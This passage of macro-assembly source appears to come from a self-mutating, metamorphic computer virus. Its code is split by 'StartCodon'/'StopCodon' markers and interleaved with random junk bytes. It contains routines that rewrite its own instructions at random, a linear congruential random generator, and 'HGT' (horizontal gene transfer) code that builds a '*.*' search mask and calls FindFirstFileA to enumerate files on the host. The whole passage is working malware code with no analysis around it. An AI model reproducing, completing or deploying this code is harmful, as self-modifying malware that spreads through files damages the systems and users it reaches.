        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 13
db 181
db 18
db 1
db 9
db 66
db 207
db 173
db 112
db 234
db 215
db 255
db 227
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
;        _getdata
;        _nopdA               ; RegA=InsStart
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=144
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 20
db 131
db 202
db 55
db 32
db 141
db 226
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdB
    _getDO
db StopCodon
db 129
db 223
db 253
db 147
db StartCodon
    BigNum=nBlockSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 161
db 111
db 103
db 74
db 238
db 227
db 233
db 50
db 118
db 211
db 75
db 128
db 230
db 63
db 16
db 4
db 78
db 108
db 210
db 34
db 170
db 157
db 241
db 13
db 3
db 25
db 44
db 53
db 236
db 19
db 15
db 120
db 52
db 149
db 127
db 149
db 187
db 46
db 64
db 113
db 47
db 41
db 183
db 138
db 8
db 229
db 1
db 171
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 91
db 63
db 61
db 75
db 95
db 1
db 108
db 167
db 68
db 132
db 54
db 239
db 238
db 155
db 97
db 41
db 41
db 79
db 178
db 170
db 218
db 74
db 169
db 18
db 73
db 215
db 235
db 163
db 207
db 7
db 136
db 208
db 77
db 251
db 6
db 39
db 18
db 38
db 78
db 170
db 10
db 149
db 177
db 139
db StartCodon
        _save
        _and
        _popall
    end if
       _getdata
       _nopdD               ; RegD=nBlockSize=c
; do
       _getEIP
       _sub0001
       _sub0001
       _sub0001
       _sub0001
db StopCodon
db 22
db 188
db 70
db 67
db 47
db 205
db 70
db 65
db 191
db 245
db 73
db 153
db 175
db 214
db 113
db 112
db 34
db 207
db 215
db 183
db 44
db 141
db 13
db StartCodon
       _sub0001
       _saveJmpOff          ; mov BA2, eip
       _nopsD               ; BC1=c
       _save                ; BC2=c
       _nopsA               ; BC1=InsStart
       _addsaved            ; BC1=InsStart+c
       _saveWrtOff          ; BA1=InsStart+c
       _pop                 ; If BC1=0: mutate
       _push
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 8
db 217
db 17
db 151
db 46
db 8
db 253
db 113
db 43
db 1
db 7
db 242
db 125
db 135
db 97
db 17
db 58
db 233
db 145
db 100
db 95
db 145
db 37
db 22
db 36
db 129
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _sub0001             ; Get the zer0 flag
       _JnzDown
               _nopREAL
               _nopREAL
               _nopsB
               _writeByte           ; *(InsStart+c)==_nopREAL
       _nopsD
       _sub0001
       _nopdD               ; RegD=c-1
       _JnzUp
; while --c
       _pop         ; remove (rand() % InsertThreshold1) from Stack
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=((HGTEnd1-HGTStart1)*8)
    AlreadyStarted=0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 252
db 116
db 63
db 155
db 176
db 57
db 125
db 97
db 182
db 187
db 34
db 3
db 38
db 131
db 17
db 174
db 40
db 187
db 252
db 181
db 255
db 191
db 92
db 79
db 219
db 220
db 183
db 202
db 226
db 10
db 95
db 219
db 240
db 207
db 195
db 144
db 215
db 162
db 87
db 64
db 230
db 74
db 151
db 196
db 106
db 163
db 79
db 61
db 112
db 157
db 159
db 61
db 74
db 187
db 80
db 8
db 209
db 220
db 91
db 51
db 115
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 245
db 97
db 93
db 47
db 233
db 55
db 34
db 33
db 224
db 102
db 38
db 187
db 129
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
       _getEIP
     HGTStart1:
    BigNum=3
    AlreadyStarted=0
db StopCodon
db 24
db 229
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 255
db 158
db 4
db 251
db 201
db 74
db 224
db 124
db 4
db 242
db 39
db 88
db 87
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _addsaved
       _nopdB                               ; Save Addresse in RegB
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
db StopCodon
db 172
db 219
db 237
db 147
db 174
db 58
db 173
db 166
db 51
db 140
db 168
db 181
db 186
db 178
db 203
db 239
db 214
db 209
db 234
db 67
db 83
db 207
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 205
db 80
db 171
db 41
db 124
db 8
db 9
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 247
db 229
db 53
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 109
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 190
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 123
db 26
db 215
db 0
db 37
db 15
db 159
db 183
db 132
db 146
db 167
db 189
db 241
db 59
db 183
db 123
db 72
db 223
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 62
db 111
db 232
db 177
db 13
db 127
db 82
db 208
db 167
db 240
db 60
db 124
db 155
db 219
db 70
db 44
db 118
db 95
db 66
db 234
db 32
db 98
db 73
db 183
db 250
db 101
db 86
db 82
db 139
db 185
db 199
db 4
db 56
db 60
db 236
db 204
db 217
db 55
db 119
db 25
db 227
db 106
db 124
db 72
db 172
db 98
db 146
db 224
db 102
db 172
db 202
db 201
db 136
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA                               ; mov RegA, [RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdD                               ; mov RegD, 0
    BigNum=HGTThreshold1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div                                 ; div BC1 <- RegD = rand() % HGTThreshold1
       _nopsD
       _save
       _and                                 ; Is zero?
       _JnzDown                             ; Simulate a JzDown
               _nopREAL     ; BC1=0
               _nopREAL
               _add0001
               _JnzDown
                       _nopsB     ; BC1!=0
                       _call      ; jmp over HGT
                       _nopREAL
                       _nopREAL
    _getDO
    BigNum=HGT_searchmask-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 105
db 82
db 80
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x002A2E2A
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 160
db 173
db 145
db 191
db 98
db 11
db 150
db 239
db 134
db 121
db 204
db 158
db 139
db 67
db 30
db 194
db 168
db 61
db 166
db 50
db 225
db 103
db 31
db 12
db 254
db 237
db 205
db 164
db 16
db 247
db 126
db 69
db 52
db 220
db 186
db 85
db 253
db 182
db 73
db 119
db 149
db 45
db 197
db 151
db 182
db 19
db 237
db 162
db 254
db 86
db 5
db 227
db 53
db 83
db 34
db 136
db 15
db 184
db 28
db 144
db 26
db 66
db 245
db 78
db 171
db 230
db 236
db 206
db 68
db 102
db 118
db 32
db 177
db 179
db 34
db 254
db 135
db 27
db 126
db 204
db 25
db 16
db 221
db 89
db 131
db 245
db 107
db 114
db 153
db 209
db 215
db 180
db 161
db 48
db 193
db 138
db 199
db 6
db 151
db 64
db 181
db 47
db 182
db 250
db 224
db 113
db 114
db 139
db 58
db 255
db 11
db 176
db 238
db 116
db 176
db 108
db 233
db 226
db 68
db 141
db 159
db 225
db 13
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
    _getDO
    BigNum=WIN32_FIND_DATA_struct-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 232
db 6
db 0
db 254
db 79
db 154
db 104
db 150
db 221
db 169
db 76
db 79
db 196
db 76
db 164
db 73
db 154
db 71
db 57
db 151
db 87
db 65
db 16
db 86
db 48
db 201
db 54
db 221
db 30
db 17
db 105
db 6
db 110
db 213
db 250
db 55
db 221
db 224
db 158
db 203
db 207
db 55
db 83
db 109
db 161
db 94
db 170
db 120
db 75
db 192
db 12
db 132
db 120
db 20
db 45
db 143
db 231
db 142
db 245
db 236
db 154
db 215
db 23
db 18
db 115
db 4
db 24
db 137
db 14
db 117
db 233
db 29
db 142
db 236
db 71
db 171
db 164
db 9
db 180
db 226
db 65
db 253
db 239
db 163
db 191
db 6
db 185
db 107
db 71
db 115
db 228
db 141
db 22
db 62
db 42
db 102
db 18
db 62
db 65
db 168
db 135
db 201
db 173
db 59
db 243
db 95
db 63
db 125
db 114
db 76
db 67
db 86
db 40
db 154
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 163
db 194
db 134
db 75
db 104
db 227
db 16
db 131
db 82
db 250
db 34
db 178
db 1
db 239
db 253
db 115
db 213
db 130
db 192
db 66
db 78
db 140
db 121
db 50
db 97
db 104
db 10
db 195
db 150
db 213
db 99
db 39
db 53
db 143
db 206
db 232
db 197
db 174
db 131
db 175
db 14
db 54
db 151
db 68
db 72
db 50
db 35
db 236
db 241
db 98
db 79
db 23
db 150
db 154
db 186
db 120
db 19
db 138
db 179
db 78
db 146
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 67
db 104
db 117
db 165
db 96
db 230
db 163
db 71
db 14
db 125
db 226
db 124
db 56
db 45
db 146
db 80
db 92
db 54
db 244
db 35
db 255
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
    _getDO
db StopCodon
db 242
db 175
db 91
db 188
db 185
db 32
db 24
db 81
db 112
db 100
db 110
db 153
db 117
db 19
db 242
db 21
db 15
db 66
db 226
db 219
db 173
db 66
db 249
db 253
db 75
db 51
db 117
db 42
db 74
db 31
db 59
db 178
db 143
db 74
db 21
db 238
db 226
db 115
db 91
db 21
db 127
db 56
db 4
db 26
db 188
db 72
db 10
db 156
db 81
db 83
db 206
db 148
db 225
db 205
db 10
db 164
db 53
db 67
db 199
db 236
db 83
db 125
db 126
db 18
db 199
db 6
db 46
db 166
db 103
db 48
db 220
db 79
db 239
db 23
db 185
db 224
db 24
db 232
db 197
db 15
db 213
db 72
db 133
db 43
db 51
db 48
db 193
db 170
db 252
db 142
db 204
db 244
db 221
db 223
db 166
db 236
db 68
db 11
db 30
db 103
db 253
db 39
db 249
db 159
db 250
db 237
db 99
db 0
db 112
db 245
db 67
db StartCodon
    BigNum=HGT_searchmask-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
    _getDO
    BigNum=hFindFirstFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
